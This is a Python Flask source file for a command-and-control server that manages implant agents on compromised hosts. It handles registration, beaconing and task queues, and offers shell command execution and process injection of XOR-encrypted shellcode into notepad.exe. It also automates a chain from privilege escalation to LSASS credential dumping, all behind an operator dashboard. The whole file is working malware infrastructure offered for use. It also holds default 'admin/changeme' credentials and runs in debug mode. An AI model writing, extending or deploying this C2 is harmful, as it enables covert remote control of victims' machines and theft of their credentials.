import os
import sys
import json
import base64
import time
import uuid
import threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template, redirect, url_for, flash, send_file
from werkzeug.security import generate_password_hash, check_password_hash
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
import logging
from io import BytesIO

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max upload

# Ensure uploads directory exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Login manager setup
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# In-memory data stores (replace with databases in production)
users = {
    'admin': {
        'password': generate_password_hash('changeme'),
        'is_admin': True
    }
}

agents = {}  # Store agent information
tasks = {}   # Tasks queue for each agent
results = {}  # Results from tasks

# User model for Flask-Login
class User(UserMixin):
    def __init__(self, id, is_admin=False):
        self.id = id
        self.is_admin = is_admin

@login_manager.user_loader
def load_user(user_id):
    if user_id in users:
        return User(user_id, users[user_id].get('is_admin', False))
    return None

# API Routes for agent communication
@app.route('/api/agents/register', methods=['POST'])
def register_agent():
    try:
        data = request.json.get('data')
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
            
        # Decode data (base64 + JSON)
        try:
            decoded_data = json.loads(base64.b64decode(data).decode())
        except:
            return jsonify({'status': 'error', 'message': 'Invalid data format'}), 400
            
        agent_id = decoded_data.get('agent_id')
        system_info = decoded_data.get('system_info', {})
        timestamp = decoded_data.get('timestamp', datetime.now().isoformat())
        
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Agent ID required'}), 400
            
        # Store agent information
        agents[agent_id] = {
            'id': agent_id,
            'system_info': system_info,
            'first_seen': timestamp,
            'last_seen': timestamp,
            'ip_address': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'status': 'active'
        }
        
        # Initialize task queue for this agent
        if agent_id not in tasks:
            tasks[agent_id] = []
            
        # Initialize results store for this agent
        if agent_id not in results:
            results[agent_id] = []
            
        logging.info(f"Agent registered: {agent_id} from {request.remote_addr}")
        return jsonify({'status': 'success', 'message': 'Agent registered successfully'}), 200
        
    except Exception as e:
        logging.error(f"Error registering agent: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agents/beacon', methods=['POST'])
def agent_beacon():
    try:
        data = request.json.get('data')
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
            
        # Decode data
        try:
            decoded_data = json.loads(base64.b64decode(data).decode())
        except:
            return jsonify({'status': 'error', 'message': 'Invalid data format'}), 400
            
        agent_id = decoded_data.get('agent_id')
        system_info = decoded_data.get('system_info', {})
        status = decoded_data.get('status', 'active')
        task_status = decoded_data.get('task_status', {})
        timestamp = decoded_data.get('timestamp', datetime.now().isoformat())
        
        if not agent_id or agent_id not in agents:
            return jsonify({'status': 'error', 'message': 'Unknown agent'}), 404
            
        # Update agent information
        agents[agent_id].update({
            'system_info': system_info,
            'last_seen': timestamp,
            'ip_address': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'status': status,
            'task_status': task_status
        })
        
        # Check if there are any automated tasks to queue based on system_info
        automated_task = check_for_automated_tasks(agent_id, system_info)
        if automated_task:
            tasks[agent_id].append(automated_task)
        
        return jsonify({'status': 'success'}), 200
        
    except Exception as e:
        logging.error(f"Error processing beacon: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_agent_tasks(agent_id):
    try:
        if agent_id not in agents:
            return jsonify({'status': 'error', 'message': 'Unknown agent'}), 404
            
        # Update agent's last_seen timestamp
        agents[agent_id]['last_seen'] = datetime.now().isoformat()
        
        # Get pending tasks for this agent
        pending_tasks = tasks.get(agent_id, [])
        
        # If there are no tasks, return empty list
        if not pending_tasks:
            return jsonify([]), 200
            
        # Get the next task and remove it from the queue
        next_task = pending_tasks.pop(0)
        
        # Encode task data
        encoded_data = base64.b64encode(json.dumps(next_task).encode()).decode()
        
        return jsonify({'data': encoded_data}), 200
        
    except Exception as e:
        logging.error(f"Error getting tasks for agent {agent_id}: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/results', methods=['POST'])
def receive_results():
    try:
        data = request.json.get('data')
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
            
        # Decode data
        try:
            decoded_data = json.loads(base64.b64decode(data).decode())
        except:
            return jsonify({'status': 'error', 'message': 'Invalid data format'}), 400
            
        agent_id = decoded_data.get('agent_id')
        task_id = decoded_data.get('task_id')
        result = decoded_data.get('result', {})
        timestamp = decoded_data.get('timestamp', datetime.now().isoformat())
        
        if not agent_id or agent_id not in agents:
            return jsonify({'status': 'error', 'message': 'Unknown agent'}), 404
            
        # Store result
        result_entry = {
            'id': str(uuid.uuid4()),
            'agent_id': agent_id,
            'task_id': task_id,
            'result': result,
            'timestamp': timestamp,
            'processed': False
        }
        
        # Add to results
        if agent_id not in results:
            results[agent_id] = []
        results[agent_id].append(result_entry)
        
        # Process result if needed (e.g., automated response)
        process_result(agent_id, task_id, result)
        
        logging.info(f"Received result from agent {agent_id} for task {task_id}")
        return jsonify({'status': 'success'}), 200
        
    except Exception as e:
        logging.error(f"Error processing result: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Task Automation Logic
def check_for_automated_tasks(agent_id, system_info):
    """
    Check if any automated tasks should be executed based on system_info
    Returns a task object if one should be executed, None otherwise
    """
    # Example: Automatically inject shellcode into notepad.exe on Windows 10 systems
    if system_info.get('os') == 'Windows' and '10' in system_info.get('os_version', ''):
        # Check if process_injection module is available
        if system_info.get('available_modules', {}).get('process_injection', False):
            # Check if we've already sent this task
            agent_results = results.get(agent_id, [])
            for result in agent_results:
                if result.get('task_id', '').startswith('auto_inject'):
                    # Already sent this task
                    return None
                    
            # Create task to inject test shellcode into notepad.exe
            # This is just an example - in a real scenario, you would use actual shellcode
            test_shellcode = bytes([
                0x48, 0x31, 0xC0,           # xor rax, rax
                0x48, 0x83, 0xC0, 0x00,     # add rax, 0  (exit code)
                0xC3                        # ret
            ])
            
            # XOR encrypt the shellcode
            key = 0x55
            encrypted_shellcode = bytes([b ^ key for b in test_shellcode])
            
            # Create task
            task = {
                'id': f"auto_inject_{uuid.uuid4()}",
                'type': 'process_injection',
                'data': {
                    'process': 'notepad.exe',
                    'shellcode': base64.b64encode(encrypted_shellcode).decode(),
                    'encryption_type': 'xor'
                },
                'timestamp': datetime.now().isoformat()
            }
            
            logging.info(f"Created automated injection task for agent {agent_id}")
            return task
    
    return None

def process_result(agent_id, task_id, result):
    """
    Process task results and potentially create follow-up tasks
    """
    # Example: If a system info task returns, check for privilege escalation opportunities
    if task_id.startswith('system_info'):
        # If admin privileges not already present, try priv esc
        if (result.get('status') == 'success' and 
            result.get('system_info', {}).get('is_admin', False) == False):
            
            # Queue a privilege escalation task
            priv_esc_task = {
                'id': f"priv_esc_{uuid.uuid4()}",
                'type': 'privilege_escalation',
                'data': {
                    'method': 'windows_services'
                },
                'timestamp': datetime.now().isoformat()
            }
            
            if agent_id in tasks:
                tasks[agent_id].append(priv_esc_task)
                logging.info(f"Queued follow-up privilege escalation task for agent {agent_id}")
    
    # Example: After priv esc, try credential dumping
    elif task_id.startswith('priv_esc') and result.get('status') == 'success':
        # Queue credential dump task
        cred_dump_task = {
            'id': f"cred_dump_{uuid.uuid4()}",
            'type': 'credential_dump',
            'data': {
                'method': 'lsass'
            },
            'timestamp': datetime.now().isoformat()
        }
        
        if agent_id in tasks:
            tasks[agent_id].append(cred_dump_task)
            logging.info(f"Queued follow-up credential dump task for agent {agent_id}")

# Web Interface Routes
@app.route('/')
@login_required
def index():
    return render_template('index.html', agents=agents)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in users and check_password_hash(users[username]['password'], password):
            user = User(username, users[username].get('is_admin', False))
            login_user(user)
            return redirect(url_for('index'))
        else:
            flash('Invalid username or password')
    
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/agents')
@login_required
def view_agents():
    return render_template('agents.html', agents=agents)

@app.route('/agent/<agent_id>')
@login_required
def agent_detail(agent_id):
    if agent_id not in agents:
        flash('Agent not found')
        return redirect(url_for('view_agents'))
        
    agent_results = results.get(agent_id, [])
    pending_tasks = tasks.get(agent_id, [])
    
    return render_template('agent_detail.html', 
                          agent=agents[agent_id], 
                          results=agent_results,
                          tasks=pending_tasks)

@app.route('/tasks')
@login_required
def view_tasks():
    all_tasks = []
    for agent_id, agent_tasks in tasks.items():
        for task in agent_tasks:
            task['agent_id'] = agent_id
            all_tasks.append(task)
            
    return render_template('tasks.html', tasks=all_tasks)

@app.route('/create_task', methods=['GET', 'POST'])
@login_required
def create_task():
    if request.method == 'POST':
        agent_id = request.form.get('agent_id')
        task_type = request.form.get('task_type')
        
        if not agent_id or not task_type or agent_id not in agents:
            flash('Invalid agent or task type')
            return redirect(url_for('create_task'))
            
        # Create task based on type
        task_data = {}
        
        if task_type == 'shell_command':
            command = request.form.get('command')
            if not command:
                flash('Command is required')
                return redirect(url_for('create_task'))
            task_data['command'] = command
            
        elif task_type == 'process_injection':
            process = request.form.get('process')
            if not process:
                flash('Target process is required')
                return redirect(url_for('create_task'))
                
            task_data['process'] = process
            
            # Handle shellcode file upload
            if 'shellcode_file' in request.files:
                file = request.files['shellcode_file']
                if file.filename:
                    shellcode = file.read()
                    # XOR encrypt the shellcode
                    key = 0x55
                    encrypted_shellcode = bytes([b ^ key for b in shellcode])
                    task_data['shellcode'] = base64.b64encode(encrypted_shellcode).decode()
                    task_data['encryption_type'] = 'xor'
            
        # Create task object
        task = {
            'id': str(uuid.uuid4()),
            'type': task_type,
            'data': task_data,
            'timestamp': datetime.now().isoformat()
        }
        
        # Add to tasks queue
        if agent_id not in tasks:
            tasks[agent_id] = []
        tasks[agent_id].append(task)
        
        flash(f'Task created successfully for agent {agent_id}')
        return redirect(url_for('view_tasks'))
        
    return render_template('create_task.html', agents=agents)

@app.route('/results')
@login_required
def view_results():
    all_results = []
    for agent_id, agent_results in results.items():
        for result in agent_results:
            all_results.append(result)
            
    return render_template('results.html', results=all_results)

@app.route('/shellcode_generator')
@login_required
def shellcode_generator():
    return render_template('shellcode_generator.html')

# Simple templates
@app.route('/templates')
def get_templates():
    template_dir = os.path.join(app.root_path, 'templates')
    # Check if we need to create the templates directory and generate default templates
    if not os.path.exists(template_dir):
        os.makedirs(template_dir)
        
        # Create basic templates
        templates = {
            'login.html': '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>C2 Server - Login</title>
                <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
            </head>
            <body class="bg-dark text-light">
                <div class="container mt-5">
                    <div class="row justify-content-center">
                        <div class="col-md-6">
                            <div class="card bg-secondary">
                                <div class="card-header">
                                    <h4>C2 Server Login</h4>
                                </div>
                                <div class="card-body">
                                    <form method="post">
                                        <div class="form-group">
                                            <label for="username">Username</label>
                                            <input type="text" class="form-control" id="username" name="username" required>
                                        </div>
                                        <div class="form-group">
                                            <label for="password">Password</label>
                                            <input type="password" class="form-control" id="password" name="password" required>
                                        </div>
                                        <button type="submit" class="btn btn-primary">Login</button>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </body>
            </html>
            ''',
            
            'index.html': '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>C2 Server - Dashboard</title>
                <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
            </head>
            <body class="bg-dark text-light">
                <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
                    <a class="navbar-brand" href="/">C2 Server</a>
                    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
                        <span class="navbar-toggler-icon"></span>
                    </button>
                    <div class="collapse navbar-collapse" id="navbarNav">
                        <ul class="navbar-nav">
                            <li class="nav-item active">
                                <a class="nav-link" href="/">Dashboard</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="/agents">Agents</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="/tasks">Tasks</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="/results">Results</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="/create_task">Create Task</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="/shellcode_generator">Shellcode</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="/logout">Logout</a>
                            </li>
                        </ul>
                    </div>
                </nav>
                
                <div class="container mt-4">
                    <div class="row">
                        <div class="col-md-12">
                            <h2>Dashboard</h2>
                            <div class="card bg-secondary mb-4">
                                <div class="card-header">
                                    <h5>Agent Summary</h5>
                                </div>
                                <div class="card-body">
                                    <div class="row">
                                        <div class="col-md-4">
                                            <div class="card bg-success text-white mb-3">
                                                <div class="card-body">
                                                    <h5 class="card-title">Active Agents</h5>
                                                    <p class="card-text display-4">{{ agents|selectattr('status', 'equalto', 'active')|list|length }}</p>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-4">
                                            <div class="card bg-warning text-white mb-3">
                                                <div class="card-body">
                                                    <h5 class="card-title">Pending Tasks</h5>
                                                    <p class="card-text display-4">{{ tasks|sum(attribute='length') }}</p>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-4">
                                            <div class="card bg-info text-white mb-3">
                                                <div class="card-body">
                                                    <h5 class="card-title">Results</h5>
                                                    <p class="card-text display-4">{{ results|sum(attribute='length') }}</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="card bg-secondary">
                                <div class="card-header">
                                    <h5>Recent Agents</h5>
                                </div>
                                <div class="card-body">
                                    <div class="table-responsive">
                                        <table class="table table-dark">
                                            <thead>
                                                <tr>
                                                    <th>Agent ID</th>
                                                    <th>Hostname</th>
                                                    <th>IP Address</th>
                                                    <th>OS</th>
                                                    <th>Last Seen</th>
                                                    <th>Status</th>
                                                    <th>Actions</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                {% for agent_id, agent in agents.items() %}
                                                <tr>
                                                    <td>{{ agent_id[-8:] }}</td>
                                                    <td>{{ agent.system_info.hostname }}</td>
                                                    <td>{{ agent.ip_address }}</td>
                                                    <td>{{ agent.system_info.os }} {{ agent.system_info.os_release }}</td>
                                                    <td>{{ agent.last_seen }}</td>
                                                    <td>
                                                        <span class="badge {% if agent.status == 'active' %}badge-success{% else %}badge-danger{% endif %}">
                                                            {{ agent.status }}
                                                        </span>
                                                    </td>
                                                    <td>
                                                        <a href="/agent/{{ agent_id }}" class="btn btn-sm btn-primary">Details</a>
                                                    </td>
                                                </tr>
                                                {% endfor %}
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
                <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
                <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
            </body>
            </html>
            '''
        }
        
        # Write templates to files
        for name, content in templates.items():
            with open(os.path.join(template_dir, name), 'w') as f:
                f.write(content)
    
    return "Templates created"

# Main entry point
if __name__ == '__main__':
    # Create initial user if not exists
    if 'admin' not in users:
        users['admin'] = {
            'password': generate_password_hash('changeme'),
            'is_admin': True
        }
        
    # Check if templates route exists
    if '/templates' not in [rule.rule for rule in app.url_map.iter_rules()]:
        print("Warning: /templates route not defined!")
    
    # Run the server
    host = '0.0.0.0'  # Bind to all interfaces
    port = int(os.environ.get('PORT', 5001))
    
    print(f"Starting C2 server on {host}:{port}")
    print("Default credentials: admin / changeme")
    
    app.run(host=host, port=port, debug=True) 